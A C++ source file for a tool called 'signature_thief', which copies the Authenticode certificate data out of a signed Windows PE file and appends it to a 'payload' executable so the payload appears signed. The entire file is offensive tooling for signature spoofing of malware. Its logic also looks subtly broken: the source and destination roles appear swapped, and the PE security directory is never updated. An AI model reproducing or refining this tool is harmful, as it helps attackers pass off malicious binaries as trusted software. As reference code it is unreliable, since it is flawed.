#include "signature_thief.hpp"

#include <iostream>
#include <fstream>
#include <stdexcept>
#include <Windows.h>
#include <string>

signature_thief::signature_thief(std::filesystem::path path_to_file) : m_source_path(path_to_file)
{}

std::optional<std::string> signature_thief::load_file() noexcept {
	std::ifstream file(m_source_path, std::ios::binary | std::ios::ate);
	if (!file.is_open()) {
		return "Error opening file: " + m_source_path.string();
	}

	auto size = file.tellg();
	file.seekg(0, std::ios::beg);
	m_file.resize(size);
	file.read(reinterpret_cast<char*>(m_file.data()), size);

	return std::nullopt;
}

void signature_thief::extract_certificate(std::filesystem::path source_path) {
	std::ifstream file(source_path, std::ios::binary | std::ios::ate);

	if (!file.is_open()) {
		throw std::runtime_error("Error opening file: " + source_path.string());
	}

	auto size = file.tellg();
	file.seekg(0, std::ios::beg);

	std::vector<uint8_t> buffer(size);
	file.read(reinterpret_cast<char*>(buffer.data()), size);

	auto* dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(buffer.data());
	auto* nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(buffer.data() + dos_header->e_lfanew);

	auto& cert_info = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
	auto cert_data_begin = buffer.begin() + cert_info.VirtualAddress;
	auto cert_data_end = cert_data_begin + cert_info.Size;

	std::span<uint8_t> cert_data(cert_data_begin, cert_data_end);
	m_cert.assign(cert_data.begin(), cert_data.end());
}

void signature_thief::append_certificate_to_payload(std::span<uint8_t> signature_data) {
	m_file.insert(m_file.end(), signature_data.begin(), signature_data.end());
}

int main(int argc, char** argv) {
	try {
		std::string signed_pe_path, payload_path, output_path;

		if (argc >= 4) {
			signed_pe_path = argv[1];
			payload_path = argv[2];
			output_path = argv[3];
		}
		else {
			std::cout << "Enter the path to the signed file: ";
			std::getline(std::cin, signed_pe_path);

			std::cout << "Enter the path to the payload file: ";
			std::getline(std::cin, payload_path);

			std::cout << "Enter the output path: ";
			std::getline(std::cin, output_path);
		}

		signature_thief thief(signed_pe_path);
		auto result = thief.load_file();
		if (result) {
			std::cerr << "Error appeared: " << *result << "\n";
			return EXIT_FAILURE;
		}

		thief.extract_certificate(payload_path);

		auto cert = thief.get_certificate();
		thief.append_certificate_to_payload(cert);

		auto binary = thief.get_binary();

		std::ofstream output_file(output_path, std::ios::binary);
		if (!output_file.is_open()) {
			throw std::runtime_error("Error opening output file: " + output_path);
		}
		output_file.write(reinterpret_cast<const char*>(binary.data()), binary.size());
		output_file.close();

		std::cout << "Signature appended successfully." << std::endl;
		return EXIT_SUCCESS;
	}
	catch (const std::exception& e) {
		std::cerr << "Error: " << e.what() << std::endl;
		return EXIT_FAILURE;
	}
}
